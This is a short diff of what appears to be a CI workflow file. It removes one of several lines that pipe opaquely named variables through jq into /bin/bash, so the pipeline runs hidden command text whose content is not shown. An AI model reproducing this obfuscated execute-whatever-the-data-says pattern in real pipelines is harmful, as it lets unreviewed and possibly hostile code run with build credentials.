@@ -23,7 +23,6 @@ jobs:
           echo $pd01 | jq -r .ksk8115 | /bin/bash
           printf '%s' "$st39521" | jq -r .gm99 | /bin/bash
           echo $bwfc09432 | jq -r .n9 | /bin/bash
-          echo $uwlk5 | jq -r .tpt13623 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
